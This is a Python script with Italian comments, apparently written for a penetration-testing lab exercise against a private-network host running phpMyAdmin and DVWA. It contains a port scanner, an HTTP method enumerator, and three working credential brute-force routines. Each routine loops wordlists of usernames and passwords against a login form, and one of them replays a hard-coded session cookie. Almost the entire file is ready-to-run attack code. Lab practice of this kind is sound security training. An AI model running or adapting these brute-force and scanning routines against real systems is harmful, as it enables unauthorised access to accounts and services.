import urllib.parse
import http.client
import requests
import socket
import os
import sys
import urllib.request



def portscanner():
	# Richiesta in input dell'IP target e del range di porte da valutare
	# facendo già inserire il valore minimo e massimo delle porte
	target= input("Inserire IP target: ")
	inizio= int(input("Inserisci valore minimo porta: "))
	fine= int(input("Inserisci valore massimo porta: "))

	# Controllo se i valori delle porte sono in ordine crescente,
	# in caso contrario scambio le variabili senza richiedere un nuovo inserimento
	if(fine<inizio):
		temp=inizio
		inizio=fine
		fine=temp

	# Ciclo for per scorrere tutte le porte richieste dall'utente e verificarne lo stato
	for porta in range(inizio, fine+1):
		s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		stato= s.connect_ex( (target, porta))
	# Se lo stato è = a 0 allora la porta è aperta e stampa che quella porta è aperta
		if(stato == 0):
			print("La porta ",porta," e' aperta")
		s.close()
	print("\nLe altre porte sono chiuse")


def enumerazionehttp():

	# Dichiarazione delle varibili target, porta e metodi che rappresentano
	# la coppia IPiporta e il relativo metodo da scansionare
	target= "192.168.50.101"
	porta= 80
	metodi= ["GET","OPTIONS", "POST", "HEAD", "TRACE", "DELETE", "PUT"]
	# Ciclio for per scansionare ogni metodo della lista sopra
	for metodo in metodi:
		try:
			conn=http.client.HTTPConnection (target, porta)
			conn.request (metodo, "/phpMyAdmin")
			response= conn.getresponse()
	# Controllo sullo stato della risposta:
	# se è ‹ di 400 allora il metodo è attivo altrimenti non è attivo
			if response.status < 400:
				print ("il metodo ",metodo," e' attivo")
			else:
				print ("il metodo ",metodo, " non e' attivo")

	# Eccezione nel caso in cui la connessione venisse rifiutata
		except ConnectionRefusedError:
			print( "Connessione rifiutata")
	# Eccezione nel caso in cui ci fosse un errore nella richiesta al server
		except http.client.HTTPException:
			print( "Errore durante la richiesta al server")
	# Chiusura della connessione
	conn.close()


def bruteforcephp():

	# Dichiarazione delle variabili contenenti il percorso del file con liste username e password
	username_file = '/home/kali/Desktop/brute/usernames.txt'
	password_file = '/home/kali/Desktop/brute/password.txt'
	# Variabile per conteggiare i tentativi
	numerotentativi = 0
	# L'istruzione with è usata per aprire i due file in sola lettura
	with open(username_file, 'r') as usernames:
		with open(password_file, 'r') as passwords:
			# Leggi tutti gli usernames e le passwords in due liste separate
			username_list = usernames.readlines()
			password_list = passwords.readlines()
			# Ciclo for concatenato per provare ogni possibile combinazione delle credenziali
			for username in username_list:
				for password in password_list:
					username = username.strip()
					password = password.strip()
					# URL di destinazione per la richiesta POST
					url = 'http://192.168.50.101/phpMyAdmin/'
					response = requests.post(url, data={'pma_username': username, 'pma_password': password, 'input_go': "Go"})

					numerotentativi = numerotentativi + 1
					# Controllo sullo stato della risposta, se uguale a 200 effettua il controllo per verificare se la stringa
					# "access denied" è contenuta all'interno del testo di risposta
					if response.status_code == 200:
						# Se la stringa è presente allora le credenziali sono errate, altrimenti sono corrette
						if 'Access denied' in response.text:
							print('Accesso errato -->', username, '-', password)
						else:
							print('Accesso riuscito -->', username, '-', password)
							print('Accesso effettuato in', numerotentativi, 'tentativi')
							exit()
					else:
						print('Errore nella richiesta:', response.status_code)
                    
def bruteforcedvwa():

	## ARGOMENTI DI DEFAULT
	bsHost = "192.168.50.101"
	bsUrl = "http://192.168.50.101/dvwa/vulnerabilities/brute/"
	bsCookie = "security=high; PHPSESSID=7e37d7afc3ca0ab55d8dd9f0c3759f21"

	## Apertura e lettura dei file contenenti usernames e password
	if os.path.isfile('/home/kali/Desktop/brute/usernames.txt'):
		with open('/home/kali/Desktop/brute/usernames.txt', 'r') as dict_user_file:
			dict_user = dict_user_file.readlines()

			if os.path.isfile('/home/kali/Desktop/brute/password.txt'):
				with open('/home/kali/Desktop/brute/password.txt', 'r') as dict_password_file:
					dict_password = dict_password_file.readlines()

					## Creazione dell' header della richiesta
					header = {
					'Host': bsHost,
					'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4',
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
					'Accept-Encoding': 'gzip, deflate',
					'Accept-Language': 'en-US,en;q=0.5',
					'Cookie': bsCookie
					}

					## Creazione di una funzione che manda una richiesta al target con relativa stampa della lunghezza pagina
					def get_res(requrl, header):
						encoded_url = urllib.parse.quote(requrl, safe=':/?=&')
						req = urllib.request.Request(url=encoded_url, headers=header)
						response = urllib.request.urlopen(req)
						the_page = response.read()
						print(len(the_page))
						## Controllo della lunghezza della pagina
						if len(the_page) != 4575:
							print("Accesso eseguito")
							sys.exit()
						else:
							print("Accesso non eseguito\n")

					## Ciclo for nidificato per provare ogni combinazione di credenziali
					for line_usr in dict_user:
						for line_pwd in dict_password:
							requrl = bsUrl + "?username=" + line_usr.strip() + "&password=" + line_pwd.strip() + "&Login=Login"
							print(line_usr.strip(), "--", line_pwd.strip(), "\t")
							get_res(requrl, header)


def bruteext():


	username_file = '/home/kali/Desktop/brute/usernames.txt'
	password_file = '/home/kali/Desktop/brute/password.txt'
	numerotentativi= 0


	with open(username_file, 'r') as usernames:
		with open(password_file, 'r') as passwords:
			# Leggi tutti gli usernames e le passwords in due liste separate
			username_list = usernames.readlines()
			password_list = passwords.readlines()

			for username in username_list :
				for password in password_list:
					username = username.strip()
					password = password.strip()

					password = password.rstrip()
					post_parameters =urllib.parse.urlencode({'username': username, 'password': password,'Login':'Login'})
					headers = {'Content-Type': 'application/x-www-form-urlencoded', "Accept": "text/html,application/xhtml+xml"}
					conn = http.client.HTTPConnection('192.168.50.101', 80)
					conn.request('POST', '/dvwa/login.php', post_parameters , headers)

					response = conn.getresponse()

					numerotentativi=numerotentativi+1
					new_location=response.getheader('Location')

					if new_location != "login.php":
						print('Login riuscito con',numerotentativi,"tentativi")
						print('Accesso riuscito -->',username,'-',password)
						conn.close()
						exit()
					else:
						print('Login non riuscito')
						conn.close()

			print('Login non riuscito, fine ciclo')
			conn.close()
